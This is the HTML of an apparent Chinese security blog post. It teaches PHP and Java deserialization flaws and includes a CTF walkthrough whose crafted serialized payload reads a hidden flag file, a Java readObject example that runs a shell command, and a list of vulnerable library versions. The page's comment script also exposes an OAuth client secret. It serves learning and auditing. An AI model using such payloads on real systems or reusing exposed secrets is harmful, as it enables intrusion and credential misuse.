@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>web漏洞-反序列化基础 | FAN&#39;S BLOG</title>
+        <meta name="Description" content="syncd blog, 在成为高级开发者的路上....."><meta property="og:title" content="web漏洞-反序列化基础" />
+<meta property="og:description" content="PHP 反序列化 什么是反序列化 序列化就是把一个对象变成可以传输的字符串。反序列化就是把那串可以传输的字符串再变回对象。 为了方便理解，这里可以通过j" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/deserializ_note1/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-03-10T22:16:15&#43;08:00" />
+<meta property="article:modified_time" content="2021-03-10T22:16:15&#43;08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="web漏洞-反序列化基础"/>
+<meta name="twitter:description" content="PHP 反序列化 什么是反序列化 序列化就是把一个对象变成可以传输的字符串。反序列化就是把那串可以传输的字符串再变回对象。 为了方便理解，这里可以通过j"/>
+<meta name="theme-color" content="#ffffff">
+<meta name="msapplication-TileColor" content="#da532c">
+<link rel="canonical" href="http://example.org/deserializ_note1/" />
+<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="prev" href="http://example.org/kafka_note1/" /><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><link rel="stylesheet" href="/css/style.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "web漏洞-反序列化基础",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/deserializ_note1\/"
+        },"image": {
+                "@type": "ImageObject",
+                "url": "http:\/\/example.org\/cover.png",
+                "width":  800 ,
+                "height":  600 
+            },"genre": "posts","keywords": "安全","wordcount":  2982 ,
+        "url": "http:\/\/example.org\/deserializ_note1\/","datePublished": "2021-03-10","dateModified": "2021-03-10","publisher": {
+                "@type": "Organization",
+                "name": "赵凡",
+                "logo": {
+                "@type": "ImageObject",
+                "url": "http:\/\/example.org\/logo.png",
+                "width":  127 ,
+                "height":  40 
+                }
+            },"author": {
+                "@type": "Person",
+                "name": "fan"
+            },"description": ""
+    }
+    </script></head>
+    <body><script>
+            if (!window.localStorage || !window.localStorage.getItem('theme')) {window.isDark = window.matchMedia('(prefers-color-scheme: dark)').matches;} else {
+                window.isDark = (window.localStorage && window.localStorage.getItem('theme')) === 'dark';
+            }
+            window.isDark && document.body.classList.add('dark-theme');
+        </script><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/">FAN&#39;S BLOG</a>
+        </div>
+        <div class="menu"><a class="menu-item" href="/posts/" rel="noopener noreffer">文章</a><a class="menu-item" href="/tags/" rel="noopener noreffer">标签</a><a class="menu-item" href="/categories/" rel="noopener noreffer">分类</a><a class="menu-item" href="/about/" rel="noopener noreffer">关于</a><span class="menu-item">|</span>
+            <a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-wrapper">
+        <div class="header-container">
+            <div class="header-title">
+                <a href="/">FAN&#39;S BLOG</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="" rel="noopener noreffer">文章</a><a class="menu-item" href="/tags/" title="" rel="noopener noreffer">标签</a><a class="menu-item" href="/categories/" title="" rel="noopener noreffer">分类</a><a class="menu-item" href="/about/" title="" rel="noopener noreffer">关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+
+<script>
+    window.desktopHeaderMode = "fixed";
+    window.mobileHeaderMode = "auto";
+</script>
+<main class="main">
+                <div class="container"><article class="page single"><h1 class="single-title animated flipInX">web漏洞-反序列化基础</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="http://syncd.cn" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>fan</a>
+</span>&nbsp;
+                    <span class="post-category">收录于<a href="/categories/%E5%AE%89%E5%85%A8">
+                                <i class="far fa-folder fa-fw"></i>安全
+                            </a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i><time datetime=2021-03-10>2021-03-10</time>&nbsp;
+                <i class="fas fa-pencil-alt fa-fw"></i>约 2982 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>预计阅读 6 分钟&nbsp;</div>
+        </div><div class="toc" id="toc-auto">
+                <h2 class="toc-title">目录</h2>
+                <div class="toc-content" id="toc-content-auto"></div>
+            </div>
+            <div class="toc" id="toc-static">
+                <details>
+                    <summary>
+                        <div class="toc-title">
+                            <span>目录</span>
+                            <span><i class="details icon fas fa-angle-down"></i></span>
+                        </div>
+                    </summary>
+                    <div class="toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#php-反序列化">PHP 反序列化</a>
+      <ul>
+        <li><a href="#什么是反序列化">什么是反序列化</a>
+          <ul>
+            <li><a href="#php中类进行序列化">php中类进行序列化</a></li>
+          </ul>
+        </li>
+        <li><a href="#为什么会产生序列化漏洞">为什么会产生序列化漏洞</a></li>
+        <li><a href="#一个ctf比赛的例子">一个ctf比赛的例子</a></li>
+      </ul>
+    </li>
+    <li><a href="#java反序列化">jAVA反序列化</a>
+      <ul>
+        <li><a href="#java反序列化概述">Java反序列化概述</a></li>
+        <li><a href="#java的反序列化代码">Java的反序列化代码</a></li>
+        <li><a href="#反序列化漏洞检测流程">反序列化漏洞检测流程</a></li>
+        <li><a href="#java反序列化工具">JAVA反序列化工具</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+                </details>
+            </div><div class="content" id="content"><h2 id="php-反序列化">PHP 反序列化</h2>
+<h3 id="什么是反序列化">什么是反序列化</h3>
+<p>序列化就是把一个对象变成可以传输的字符串。反序列化就是把那串可以传输的字符串再变回对象。</p>
+<p>为了方便理解，这里可以通过json的序列化和反序列化来理解，如下代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?php
+$book = array(&#39;book1&#39; =&gt; &#34;Harry Potter&#34;, &#34;book2&#34; =&gt; &#34;MR.Bean&#34;, &#34;book3&#34; =&gt; &#34;Python Cookbook&#34;, &#34;book4&#34;=&gt;&#34;History&#34;);
+$json = json_encode($book);
+echo $json;
+</code></pre></td></tr></table>
+</div>
+</div><p>这边有一个book的数组</p>
+<p>&lsquo;book1&rsquo;=&gt;&lsquo;Harry Potter&rsquo;,</p>
+<p>&lsquo;book2&rsquo;=&gt;&lsquo;MR.Bean&rsquo;,</p>
+<p>&lsquo;book3&rsquo;=&gt;&lsquo;Python Cookbook&rsquo;,</p>
+<p>&lsquo;book4&rsquo;=&gt;&lsquo;History&rsquo;</p>
+<p>代码中通过<code>json_encode()</code>这个函数帮助我们将这个数组序列化成一串字符串. 序列化的结果为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">{&#34;book1&#34;:&#34;Harry Potter&#34;,&#34;book2&#34;:&#34;MR.Rean&#34;,&#34;book3&#34;:&#34;Python Cookbook&#34;,&#34;book4&#34;:&#34;History&#34;}
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="php中类进行序列化">php中类进行序列化</h4>
+<p>先看如下代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?php
+
+class DemoClass
+{
+    public $name = &#34;Notyeat&#34;;
+    public $sex = &#34;man&#34;;
+    public $age = &#34;18&#34;;
+}
+
+$example = new DemoClass();
+$example -&gt; name = &#34;join&#34;;
+$example -&gt; sex = &#34;Woman&#34;;
+$example -&gt; age = &#34;10&#34;;
+
+$val = serialize($example);
+echo $val;
+echo PHP_EOL;
+$new =  unserialize($val);
+echo $new -&gt; name;
+</code></pre></td></tr></table>
+</div>
+</div><p>在php中通过<code>serialize()</code>函数就可以将一个对象进行序列化unserialize()函数可以将字符串反序列化为对象，通过上面这个代码序列化的结果为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">O:9:&#34;DemoClass&#34;:3:{s:4:&#34;name&#34;;s:4:&#34;join&#34;;s:3:&#34;sex&#34;;s:5:&#34;Woman&#34;;s:3:&#34;age&#34;;s:2:&#34;10&#34;;}
+join
+</code></pre></td></tr></table>
+</div>
+</div><p>这里对上面数据从左往右依次进行说明：</p>
+<ul>
+<li>O：代表object 还有一种情况是A,array表示数组</li>
+<li>3：代表对象里面有三个变量</li>
+<li>s：变量数据类型，s代表string，i代表int</li>
+<li>s:4:&ldquo;name&rdquo;: 这里的4表示的是变量名的字符长度</li>
+</ul>
+<h3 id="为什么会产生序列化漏洞">为什么会产生序列化漏洞</h3>
+<p>php的序列化中有几个魔术方法，这几个魔术方法都是以“_” 开头，即通过某种条件触发，不用手动调用。在php反序列话漏洞中，有如下几个魔术方法需要注意：</p>
+<ul>
+<li><code>__construct()</code>: 当一个对象创建时被调用</li>
+<li><code>__destruct()</code>: 当一个对象销毁时被调用</li>
+<li><code>__toString()</code>: 当一个对象被当作一个字符串使用
+-<code> __sleep()</code> : 在对象在被序列化之前运行</li>
+<li><code>__wakeup</code>: 将在序列化之后立即被调用</li>
+</ul>
+<p>如果服务器能够接收反序列化过的字符串、并且未经过滤的把其中的变量直接放进这些魔术方法里面的话，就容易造成很严重的漏洞了。举个例子来看更加清楚：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?php
+class A{
+    var $test = &#34;demo&#34;;
+    function __destruct(){
+            echo $this-&gt;test;
+    }
+}
+$a = $_GET[&#39;test&#39;];
+$a_unser = unserialize($a);
+?&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>我们通过如下访问可以构造如下请求，页面就会打印hello：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/?test=O:1:&#34;A&#34;:1:{s:4:&#34;test&#34;;s:5:&#34;hello&#34;;}
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="一个ctf比赛的例子">一个ctf比赛的例子</h3>
+<p><a href="http://web.jarvisoj.com:32768/">http://web.jarvisoj.com:32768/</a></p>
+<p>第一次做这种题，所以整理一下第一次的解题思路：</p>
+<p>题目说了是通向神盾局内部的秘密入口</p>
+<p>看页面请求中有如下请求，很明显，img参数是base64加密了，解密后的内容为：<code>shield.jpg</code>
+<code>http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLmpwZw==</code></p>
+<p>所以想着是否可以通过<code>http://web.jarvisoj.com:32768/showimg.php?img=shield.php</code>，看是否包含这个文件，当然这里需要对 shield.php 进行加密，加密后的内容为：<code>c2hpZWxkLnBocA==</code> 访问 <code>http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocAo=</code> 得到如下代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?php
+	//flag is in pctf.php
+	class Shield {
+		public $file;
+		function __construct($filename = &#39;&#39;) {
+			$this -&gt; file = $filename;
+		}
+		
+		function readfile() {
+			if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE  
+			&amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) {
+				return @file_get_contents($this-&gt;file);
+			}
+		}
+	}
+?&gt;
+
+</code></pre></td></tr></table>
+</div>
+</div><p>从这里我们知道了flag在pctf.php, 那么执行通过读这个文件内容呢？随即访问了：<code>http://web.jarvisoj.com:32768/showimg.php?img=cGN0Zi5waHA=</code>
+页面提示<code>File not found</code> 果然没有想的那么简单。</p>
+<p>那么如果直接访问<code>http://web.jarvisoj.com:32768/pctf.php</code>,结果页面提示：
+<code>FLAG: PCTF{I_4m_not_fl4g}</code></p>
+<p>这个时候想既然已经可以看代码文件内容了那就把showimg.php的代码内容也看一下，随即访问：<code>http://web.jarvisoj.com:32768/showimg.php?img=c2hvd2ltZy5waHA=</code> 得到了内容如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?php
+	$f = $_GET[&#39;img&#39;];
+	if (!empty($f)) {
+		$f = base64_decode($f);
+		if (stripos($f,&#39;..&#39;)===FALSE &amp;&amp; stripos($f,&#39;/&#39;)===FALSE &amp;&amp; stripos($f,&#39;\\&#39;)===FALSE
+		&amp;&amp; stripos($f,&#39;pctf&#39;)===FALSE) {
+			readfile($f);
+		} else {
+			echo &#34;File not found!&#34;;
+		}
+	}
+?&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>这里和猜想的差不多就是根据img参数去读文件，不过目前我知道的有用信息是答案就在pctf.php, 这个时候看看页面下是否有index.php 文件，看看内容是什么，访问：<code>http://web.jarvisoj.com:32768/showimg.php?img=aW5kZXgucGhw</code>,看到了如下内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?php 
+	require_once(&#39;shield.php&#39;);
+	$x = new Shield();
+	isset($_GET[&#39;class&#39;]) &amp;&amp; $g = $_GET[&#39;class&#39;];
+	if (!empty($g)) {
+		$x = unserialize($g);
+	}
+	echo $x-&gt;readfile();
+?&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>看到这个基本就对怎么拿到答案了，index.php 接收一个class， 这里有序列化操作，加上上面的序列化中 __construct 这个魔术函数有相关参数，那么就构造序列化的字符串应该就可以获取flag了</p>
+<p><code>http://web.jarvisoj.com:32768/?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code> 访问得到如下结果：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?php 
+	//Ture Flag : PCTF{W3lcome_To_Shi3ld_secret_Ar3a}
+	//Fake flag:
+	echo &#34;FLAG: PCTF{I_4m_not_fl4g}&#34;
+?&gt;
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="java反序列化">jAVA反序列化</h2>
+<h3 id="java反序列化概述">Java反序列化概述</h3>
+<p>Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存或文件中，实现跨平台通讯和持久化存储。ObjectOutputStream类的 writeObject() 方法可以实现序列化。反序列化则指把字节序列恢复为 Java 对象的过程，相应的，ObjectInputStream 类的 readObject() 方法用于反序列化。</p>
+<h3 id="java的反序列化代码">Java的反序列化代码</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">com</span><span class="p">.</span><span class="nx">company</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="o">*</span><span class="p">;</span>
+
+
+<span class="nx">public</span> <span class="nx">class</span> <span class="nx">Main</span> <span class="p">{</span>
+
+    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">void</span> <span class="nf">main</span><span class="p">(</span><span class="nx">String</span><span class="p">[]</span> <span class="nx">args</span><span class="p">)</span><span class="nx">throws</span> <span class="nx">Exception</span> <span class="p">{</span>
+        <span class="nx">MyObject</span> <span class="nx">myObject</span><span class="p">=</span><span class="nx">new</span> <span class="nf">MyObject</span><span class="p">();</span>
+        <span class="nx">myObject</span><span class="p">.</span><span class="nx">name</span><span class="p">=</span><span class="s">&#34;hello world!&#34;</span><span class="p">;</span>
+        <span class="c1">//创建一个包含对象进行反序列化信息的”object”数据文件
+</span><span class="c1"></span>        <span class="nx">FileOutputStream</span> <span class="nx">fos</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">FileOutputStream</span><span class="p">(</span><span class="s">&#34;object&#34;</span><span class="p">);</span>
+        <span class="nx">ObjectOutputStream</span> <span class="nx">os</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">ObjectOutputStream</span><span class="p">(</span><span class="nx">fos</span><span class="p">);</span>
+        <span class="c1">//writeObject()方法将obj对象写入object文件
+</span><span class="c1"></span>        <span class="nx">os</span><span class="p">.</span><span class="nf">writeObject</span><span class="p">(</span><span class="nx">myObject</span><span class="p">);</span>
+        <span class="nx">os</span><span class="p">.</span><span class="nb">close</span><span class="p">();</span>
+        <span class="c1">//从文件中反序列化obj对象
+</span><span class="c1"></span>        <span class="nx">FileInputStream</span> <span class="nx">fis</span><span class="p">=</span><span class="nx">new</span> <span class="nf">FileInputStream</span><span class="p">(</span><span class="s">&#34;object&#34;</span><span class="p">);</span>
+        <span class="nx">ObjectInputStream</span> <span class="nx">ois</span><span class="p">=</span><span class="nx">new</span> <span class="nf">ObjectInputStream</span><span class="p">(</span><span class="nx">fis</span><span class="p">);</span>
+        <span class="c1">//恢复对象
+</span><span class="c1"></span>        <span class="nx">MyObject</span> <span class="nx">obj2</span><span class="p">=(</span><span class="nx">MyObject</span><span class="p">)</span><span class="nx">ois</span><span class="p">.</span><span class="nf">readObject</span><span class="p">();</span>
+        <span class="nx">System</span><span class="p">.</span><span class="nx">out</span><span class="p">.</span><span class="nb">print</span><span class="p">(</span><span class="nx">obj2</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
+        <span class="nx">ois</span><span class="p">.</span><span class="nb">close</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nx">class</span> <span class="nx">MyObject</span> <span class="nx">implements</span> <span class="nx">Serializable</span> <span class="p">{</span>
+    <span class="c1">//只有实现了Serializable接口的类的对象才可以被序列化
+</span><span class="c1"></span>    <span class="nx">public</span> <span class="nx">String</span> <span class="nx">name</span><span class="p">;</span>
+    <span class="c1">//重写readObject()方法
+</span><span class="c1"></span>    <span class="nx">private</span> <span class="nx">void</span> <span class="nf">readObject</span><span class="p">(</span><span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">ObjectInputStream</span> <span class="nx">in</span><span class="p">)</span> <span class="nx">throws</span> <span class="nx">IOException</span><span class="p">,</span> <span class="nx">ClassNotFoundException</span><span class="p">{</span>
+        <span class="c1">//执行默认的readObject()方法
+</span><span class="c1"></span>        <span class="nx">in</span><span class="p">.</span><span class="nf">defaultReadObject</span><span class="p">();</span>
+        <span class="c1">//执行打开计算器程序命令
+</span><span class="c1"></span>        <span class="nx">Runtime</span><span class="p">.</span><span class="nf">getRuntime</span><span class="p">().</span><span class="nf">exec</span><span class="p">(</span><span class="s">&#34;ls /home/fan/hugo_blog&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p>java类对象要实现反序列化，该类必须实现 java.io.Serializable接口，并且一般会调用readObect方法，该方法的实现容易引发漏洞。除了readObect，有时也会用到readUnshared方法，与readObect不同的是，此方法不允许后续的readObect/readUnshared调用此次反序列化得到的对象。</p>
+<p>实战中真正出现漏洞的情况一般有以下几种：
+（1）重写ObjectInputStream对象的resolveClass方法中的检测可被绕过。
+（2）使用第三方的类进行黑名单控制。容易存在漏网之鱼，如果后期添加了新的功能，还可能引入了新的漏洞利用方式。
+（3）使用了不安全的基础库。如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">commons-fileupload 1.3.1
+commons-io 2.4
+commons-collections 3.1
+commons-logging 1.2
+commons-beanutils 1.9.2
+org.slf4j:slf4j-api 1.7.21
+com.mchange:mchange-commons-java 0.2.11
+org.apache.commons:commons-collections 4.0
+com.mchange:c3p0 0.9.5.2
+org.beanshell:bsh 2.0b5
+org.codehaus.groovy:groovy 2.3.9
+org.springframework:spring-aop 4.1.4.RELEASE
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="反序列化漏洞检测流程">反序列化漏洞检测流程</h3>
+<ul>
+<li>反序列化操作一般应用在导入模板文件、网络通信、数据传输、日志格式化存储或DB存储等业务场景。因此审计过程中重点关注这些功能板块。</li>
+<li>找到对应的功能模块后，检索源码中对反序列化函数的调用来静态寻找反序列化的输入点，如以下函数：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">ObjectInputStream.readObject
+ObjectInputStream.readUnshared
+XMLDecoder.readObject
+Yaml.load
+XStream.fromXML
+ObjectMapper.readValue
+JSON.parseObject
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>确定了反序列化输入点后，查看应用的Class Path中是否包含Apache Commons Collections等危险库（ysoserial所支持的其他库亦可），若不包含危险库，则查看一些涉及命令、代码执行的代码区域，防止程序员代码不严谨，导致bug。若包含危险库，则使用ysoserial进行攻击。</li>
+</ul>
+<p>JSON是一种轻量级的数据交换格式，基于“键/值”对，结构可以进行嵌套。主流JSON库包含GSON、Jackson、Fastjson。</p>
+<p>注意：Fastjson不要启用autotype，若开启autotype选用黑名单策略，依旧有绕过风险</p>
+<h3 id="java反序列化工具">JAVA反序列化工具</h3>
+<p>JAVA常见的反序列化工具包含Freddy/ysoserial/marshalsec等</p>
+<ul>
+<li>ysoserial：https://github.com/frohoff/ysoserial</li>
+<li>Freddy：https://github.com/bignerdranch/Freddy</li>
+<li>marshalsec： <a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>本文于 2021-03-10 更新</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://example.org/deserializ_note1/" data-title="web漏洞-反序列化基础" data-hashtags="安全"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="http://example.org/deserializ_note1/" data-title="web漏洞-反序列化基础"><i class="fab fa-evernote fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E5%AE%89%E5%85%A8">安全</a></section>
+        <section>
+            <span><a href="javascript:window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/kafka_note1/" class="prev" rel="prev" title="Kafka学习笔记（一）---基础概念"><i class="fas fa-angle-left fa-fw"></i>Kafka学习笔记（一）---基础概念</a></div>
+</div>
+<div class="comment"><div id="gitalk"></div><script>
+            document.addEventListener("DOMContentLoaded", function(event) {
+                var gitalk = new Gitalk({
+                    id: '2021-03-10 22:16:15 \u002b0800 CST',
+                    title: 'web漏洞-反序列化基础',
+                    clientID: '12d62df89f42baf9a471',
+                    clientSecret: '603bc3951c1c2a0685201df45862a1fdb34a83f1',
+                    repo: 'blogComment',
+                    owner: 'peanut-cc',
+                    admin: ['peanut-cc'],
+                    body: decodeURI(location.href),
+                });
+                gitalk.render('gitalk');
+            });
+        </script>
+        <noscript>
+            Please enable JavaScript to view the <a href="https://github.com/gitalk/gitalk">comments powered by Gitalk.</a>
+        </noscript></div>
+    </article></div>
+            </main><footer class="footer">
+    <div class="copyright"><div class="copyright-line">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreffer">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="external nofollow noopener noreffer"><i class="far fa-heart fa-fw"></i> LoveIt</a>
+        </div>
+
